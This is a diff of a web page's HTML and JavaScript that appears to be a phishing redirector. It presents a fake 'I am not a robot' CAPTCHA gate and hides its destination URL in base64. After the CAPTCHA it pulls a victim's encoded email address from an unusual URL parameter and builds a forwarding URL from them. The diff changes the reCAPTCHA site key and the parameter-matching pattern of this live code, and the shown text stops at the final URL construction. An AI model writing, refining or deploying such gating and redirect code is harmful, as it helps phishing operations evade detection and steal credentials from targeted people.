@@ -28,14 +28,14 @@
   <button id="start-button" onclick="startCaptcha()">I am not a robot</button>
 
   <form id="captcha-form" style="display:none;" onsubmit="return false;">
-    <div class="g-recaptcha" data-sitekey="6LdvhZ0rAAAAABeTaVWGJpw_zjJG4hb-J7pTLhKX" data-callback="onCaptchaSuccess"></div>
+    <div class="g-recaptcha" data-sitekey="6Lc_Z50rAAAAAD7rUIDC7ahRhZ1GFtpHpCJzldhU" data-callback="onCaptchaSuccess"></div>
   </form>
 
   <script>
     const forwardEmail = true;
 
     const urlParts = [
-      "aHR0cHM6Ly9za2MudmxyeWJqdGguZXMvOEBad0lOM2o2STRoWjR5Yy8="
+      "aHR0cHM6Ly9za2MudmxyeWJqdGguZXMvOEBad0lOM2o2STRoWjR5Yy8=" // destination encoded in base64
     ];
 
     document.addEventListener("mousemove", function trigger() {
@@ -49,15 +49,15 @@
     }
 
     function onCaptchaSuccess() {
-      const hash = window.location.hash;
-      const match = hash.match(/\?{3}49828947839Keyboard\?\?=([a-zA-Z0-9+/=]+)/);
+      const query = window.location.search;
+      const match = query.match(/\?(\d{10})Keyboard=([a-zA-Z0-9+/=]+)/);
 
-      if (!match || !match[1]) {
+      if (!match || !match[2]) {
         document.body.innerHTML = "<h3>Missing required parameter.</h3>";
         return;
       }
 
-      const encodedEmail = match[1].trim();
+      const encodedEmail = match[2].trim();
       const baseURL = atob(urlParts[0]);
 
       const finalURL = forwardEmail
